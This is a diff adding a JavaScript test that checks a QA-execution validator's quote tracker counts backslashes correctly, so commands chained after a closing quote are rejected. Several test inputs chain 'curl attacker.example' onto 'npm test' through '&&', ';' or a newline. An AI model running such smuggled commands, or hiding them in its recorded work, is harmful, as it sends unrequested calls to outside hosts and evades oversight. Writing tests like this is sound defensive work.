@@ -43,6 +43,24 @@ test("a status print chained to another command via &&/||/| is not bookkeeping",
   assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?" >&2 && curl attacker.example`)), /runner-recorded/);
 });
 
+// The quote tracker decides whether a `"` closes the string by checking only the single preceding
+// character for a backslash. Real bash pairs backslashes off: an EVEN count before the `"` (0, 2, 4, ...)
+// leaves it unescaped and closing, an ODD count (1, 3, ...) escapes it. A one-character lookback gets
+// every count of 2 or more wrong — it sees *a* backslash immediately before the quote and treats it as
+// escaped regardless of how many precede that one, so a real closing quote is misread as still open and
+// everything after it (a real `&&`/`;`/newline boundary) is wrongly swallowed as quoted, safe content.
+test("backslash-parity before a closing quote is counted, not just glanced at", () => {
+  // 2 backslashes: the quote really closes, so the &&/;/newline after it is live shell syntax.
+  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?\\\\" && curl attacker.example`)), /runner-recorded/);
+  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?\\\\"; curl attacker.example`)), /runner-recorded/);
+  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\necho "$?\\\\"\ncurl attacker.example`)), /runner-recorded/);
+  // 4 backslashes: still even, same expectation.
+  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?\\\\\\\\" && curl attacker.example`)), /runner-recorded/);
+  // 1 backslash genuinely escapes a *mid-string* quote (real bash: the string stays open through it) —
+  // confirms the fix doesn't overcorrect into closing on every backslash-preceded quote.
+  assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\nstatus=$?\nprintf 'exit=%s\\n' "a\\"$status"`));
+});
+
 // The behaviour established by earlier passes must survive the quote-aware splitter.
 test("content matching, bookkeeping and partial-word rules are unchanged", () => {
   const core = `TMPDIR="$E/tmp" pnpm exec vitest run badge.test.tsx > "$E/out.log" 2>&1`;
